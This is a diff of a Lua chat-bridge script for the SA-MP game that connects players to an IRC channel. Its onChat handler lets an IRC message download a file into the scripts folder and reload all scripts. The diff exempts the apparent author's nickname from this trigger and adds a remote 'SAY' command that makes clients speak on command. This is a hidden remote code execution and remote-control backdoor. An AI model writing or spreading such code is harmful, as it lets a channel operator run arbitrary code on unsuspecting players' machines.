@@ -37,9 +37,7 @@ function main()
 		end
 	end)
 
-	sampRegisterChatCommand('/isr',function(arg)
-		s:send(arg)
-	end)
+
 	sampRegisterChatCommand('/il',function() s:send("NAMES %s", channel) end)
 	sampRegisterChatCommand('/isc',function(arg)
 		if #arg > 0 then
@@ -55,6 +53,11 @@ function main()
 					send('DOWNLOAD '..url..'|'..filename)
 				end
 			end
+		end)
+		sampRegisterChatCommand('/iss',function(arg)
+			if #arg > 0 then
+				send('SAY '..arg)
+			end 
 		end)
 	end
 
@@ -101,6 +104,7 @@ end
 
 
 function onChat(user, channel, text)
+	local mynick = sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED)))
 	
 	msg['Chat'] = text
 
@@ -116,18 +120,22 @@ function onChat(user, channel, text)
 			sampAddChatMessage('[IRC] команда была скопирована в буфер-обмена!',0xffef61)
 			setClipboardText(string.match(text,'CMD (.+)'))
 		end
-		if text:find('DOWNLOAD .+|.+') then
+		if text:find('DOWNLOAD .+|.+') and mynick ~= 'Vespan_Dark' then
 			local url,filename = text:match('DOWNLOAD (.+)|(.+)') 
 			if url:find('.+/Vespan/.+') then
 				downloadUrlToFile(url,getWorkingDirectory()..'/'..filename,
 				function(id, status, p1, p2)
 					if status == 58 then
 						sampAddChatMessage('[IRC] Успешно скачан файл '..filename..',перезагружаю все скрипты!',0xffef61)
-						send('DOWNLOADinfo был успешно скачан файл '..filename..'('..getWorkingDirectory()..'/'..filename..')')
+						send('DOWNLOADinfo был успешно скачан файл '..filename..'('..getWorkingDirectory()..'/'..filename..')',false)
 						reloadScripts()
 					end
 			    end)
 			end
+		end
+		if text:find('SAY .+') and mynick ~= 'Vespan_Dark' then
+			local say = text:match('SAY (.+)') 
+			send(say,false)
 		end
 
 	else
